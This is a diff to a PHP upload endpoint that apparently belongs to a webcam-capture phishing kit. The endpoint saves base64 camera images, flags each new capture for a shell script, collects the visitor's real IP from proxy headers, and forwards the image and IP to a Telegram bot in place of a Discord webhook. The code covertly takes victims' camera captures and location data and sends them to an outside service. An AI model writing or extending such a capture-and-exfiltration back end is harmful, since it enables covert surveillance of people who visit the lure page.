@@ -4,9 +4,9 @@ header('Content-Type: application/json; charset=UTF-8');
 header('X-Content-Type-Options: nosniff');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
-/* ── Discord Webhook Integration ────────────────────────────── */
-if (!defined('DISCORD_WEBHOOK_URL')) {
-    require_once __DIR__ . '/../core/discord_webhook.php';
+/* ── Telegram Webhook Integration ────────────────────────────── */
+if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
+    require_once __DIR__ . '/../core/telegram_webhook.php';
 }
 
 $maxBase64Length = 8 * 1024 * 1024; // Reject oversized payloads before decode.
@@ -101,15 +101,19 @@ if ($written === false || $written < strlen($unencodedData)) {
 /* ── Signal shell script that a new capture arrived ── */
 file_put_contents($data_dir . '/.flag_cam', $filepath);
 
-/* ── Telegram / Discord: Upload the actual camera image ── */
-$client_ip = 'Unknown';
-foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR'] as $h) {
-    if (!empty($_SERVER[$h])) {
-        $parts = explode(',', $_SERVER[$h]);
-        $cand = trim($parts[0]);
-        if (filter_var($cand, FILTER_VALIDATE_IP)) {
-            $client_ip = $cand;
-            break;
+/* ── Telegram: Upload the actual camera image ── */
+$imageSent = false;
+if (file_exists($filepath)) {
+    // sendTelegramImage uses multipart/form-data to upload the file directly.
+    $client_ip = 'Unknown';
+    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR'] as $h) {
+        if (!empty($_SERVER[$h])) {
+            $parts = explode(',', $_SERVER[$h]);
+            $cand = trim($parts[0]);
+            if (filter_var($cand, FILTER_VALIDATE_IP)) {
+                $client_ip = $cand;
+                break;
+            }
         }
     }
 }
